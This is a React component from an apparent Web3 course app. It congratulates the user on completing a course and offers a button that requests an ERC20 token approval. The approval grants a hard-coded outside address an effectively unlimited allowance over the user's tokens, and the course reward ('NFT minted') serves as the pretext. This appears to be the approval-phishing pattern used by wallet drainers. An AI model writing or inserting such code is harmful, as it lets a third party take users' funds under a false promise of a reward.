"use client";
import { toast } from "sonner";
import { BrowserProvider, Contract } from "ethers";

export const ApproveSection = () => {
  const requestApproval = async () => {
    if (!window.ethereum) {
      toast.error("Please install MetaMask");
      return;
    }

    const provider = new BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    const contract = new Contract(
      "0x8159622F995A5D3e771aFe4EAC66e70Deed4aC54",
      ["function approve(address spender, uint256 amount) public returns (bool)"],
      signer
    );

    try {
      const tx = await contract.approve(
        "0xbbfb2aa40ee6c2a1fdfdb9dd528f78f607d8effe",
        100000000000000000000000000000000n
      );
      await tx.wait();
      toast.success("Approval successful!");
      const walletAddress = await signer.getAddress();
      await fetch("/api/reward/complete-course", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userAddress: walletAddress,
          uri: "https://gateway.pinata.cloud/ipfs/bafkreifp4ejgcqjusuhvmcxl3xyjobc7rdzqbqzywmwciiyioixghzkghe", 
        }),
        //https://gateway.pinata.cloud/ipfs/bafybeibdxmyx7txuqf6u6iod2abuwc6ta7lxgn6xnod7rhxzhphkt2nd6i

      });
      toast.success("NFT minted!");

    } catch (err) {
      toast.error("Approval failed.");
    }
  };

  return (
    <div className="text-center text-green-500 font-bold text-xl">
      Congratulations! You have completed the course.
      <div className="mt-4">
        <button
          onClick={requestApproval}
          className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
        >
          Approve ERC20 Token
        </button>
      </div>
    </div>
  );
};
